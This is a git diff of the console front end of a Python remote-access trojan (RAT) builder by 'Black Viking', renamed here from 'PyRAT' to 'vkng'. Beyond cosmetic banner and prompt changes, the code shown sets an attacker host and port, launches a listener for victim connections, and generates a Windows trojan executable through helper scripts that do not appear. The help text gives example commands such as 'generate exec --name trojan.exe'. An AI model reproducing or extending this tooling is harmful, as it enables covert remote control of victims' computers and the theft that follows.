@@ -4,7 +4,7 @@
 #
 
 __author__ = "Black Viking"
-__date__   = "15.04.2017"
+__date__   = "16.04.2017"
 
 import os
 import sys
@@ -27,24 +27,22 @@ host = " "
 port = " "
 
 def logo():
-    logo = blue + """ 
-%s$$$$$$$\            $$$$$$$\   $$$$$$\ $$$$$$$$\       
-$$  __$$\           $$  __$$\ $$  __$$\\__$$  __|      
-$$ |  $$ |$$\   $$\ $$ |  $$ |$$ /  $$ |  $$ |         
-$$$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$$$ |  $$ |         
-$$  ____/ $$ |  $$ |$$  __$$< $$  __$$ |  $$ |         
-$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |         
-$$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |         
-\__|       \____$$ |\__|  \__|\__|  \__|  \__|         
-          $$\   $$ |                                   
-          \$$$$$$  |                           
-           \______/                           
-
-
-\t%s%s[>]--->       PyRAT Project      <---[<]%s
-\t[>]--->       Version: 1.0       <---[<]
-\t[>]--->   github.com/blackvkng   <---[<]
-\t[>]--->       %sBlack Viking%s       <---[<]
+    logo = blue + """ %s
+\t/$$    /$$ /$$   /$$ /$$   /$$  /$$$$$$ 
+\t| $$   | $$| $$  /$$/| $$$ | $$ /$$__  $$
+\t| $$   | $$| $$ /$$/ | $$$$| $$| $$  \__/
+\t|  $$ / $$/| $$$$$/  | $$ $$ $$| $$ /$$$$
+\t \  $$ $$/ | $$  $$  | $$  $$$$| $$|_  $$
+\t  \  $$$/  | $$\  $$ | $$\  $$$| $$  \ $$
+\t   \  $/   | $$ \  $$| $$ \  $$|  $$$$$$/
+\t    \_/    |__/  \__/|__/  \__/ \______/ 
+                                         
+                                                                                          
+\t%s%s
+\t[>]--->       Viking Project      <---[<]%s
+\t[>]--->        Version: 1.0       <---[<]
+\t[>]--->   github.com/blackvkng    <---[<]
+\t[>]--->       %sBlack Viking%s        <---[<]
 """%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
     print logo
     help()
@@ -59,23 +57,23 @@ Commands:
     start listener     : Start Listener.
 
 Example:
-    >>> PyRAT ==> set HOST 127.0.0.1
-    >>> PyRAT ==> set PORT 8000
-    >>> PyRAT ==> show listener
+    >>> vkng => set HOST 127.0.0.1
+    >>> vkng => set PORT 8000
+    >>> vkng => show options
 [~] HOST: 127.0.0.1
 [~] PORT: 8000
 ===========================================================
-    >>> PyRAT ==> start listener / start / run
+    >>> vkng => start listener / start / run
 
 #---- Generating exe files(Windows)
-    
-    >>> PyRAT ==> set HOST 127.0.0.1
-    >>> PyRAT ==> set PORT 8000
-    >>> PyRAT ==> show listener
+
+    >>> vkng => set HOST 127.0.0.1
+    >>> vkng => set PORT 8000
+    >>> vkng => show listener
 [~] HOST: 127.0.0.1
 [~] PORT: 8000
 ===========================================================
-    >>> PyRAT ==> generate exec --name trojan.exe"""
+    >>> vkng => generate exec --name trojan.exe"""
     
 
 #-----------------   Main Function   -----------------#
@@ -84,29 +82,29 @@ def main():
     global host, port
 
     while True:
-        pyrat = raw_input(bright+red+"PyRAT %s==%s> "%(Style.NORMAL, bright)).lower()
+        vkng = raw_input(bright+red+"vkng %s=%s> "%(Style.NORMAL, bright)).lower()
 
-        if pyrat == "help":
+        if vkng == "help":
             help()
 
-        elif "set host" in pyrat:
-            host = pyrat.split()[-1]
+        elif "set host" in vkng:
+            host = vkng.split()[-1]
 
-        elif "set port" in pyrat:
-            port = int(pyrat.split()[-1])
+        elif "set port" in vkng:
+            port = int(vkng.split()[-1])
 
-        elif pyrat == "show listener":
+        elif vkng == "show listener":
             print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
 
-        elif pyrat == "start" or pyrat == "run" or pyrat == "start listener":
+        elif vkng == "start" or vkng == "run" or vkng == "start listener":
             if host != " " and port != " ":
                 Popen([sys.executable, 'source/listener.py', host, str(port)], creationflags=CREATE_NEW_CONSOLE)
             else:
                 print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
 
-        elif "generate exec --name" in pyrat:
+        elif "generate exec --name" in vkng:
             if host != " " and port != " ":
-                name = pyrat.split()[-1]
+                name = vkng.split()[-1]
                 if name != "":
                     Popen([sys.executable, 'source/generate_exec.py', host, str(port), name], creationflags=CREATE_NEW_CONSOLE)
                 else:
